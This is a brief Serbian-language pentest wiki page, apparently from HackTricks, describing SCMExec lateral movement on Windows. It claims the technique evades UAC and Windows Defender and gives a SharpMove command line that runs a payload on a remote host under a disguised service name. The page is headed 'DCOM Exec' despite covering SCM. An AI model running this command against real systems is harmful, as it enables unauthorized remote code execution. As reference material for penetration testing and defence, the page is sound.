# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

## SCM

**SCMExec** je tehnika za izvršavanje komandi na udaljenim sistemima koristeći Service Control Manager (SCM) za kreiranje servisa koji izvršava komandu. Ova metoda može zaobići neke bezbednosne kontrole, kao što su User Account Control (UAC) i Windows Defender.

## Tools

- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):

SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true

{{#include ../../banners/hacktricks-training.md}}
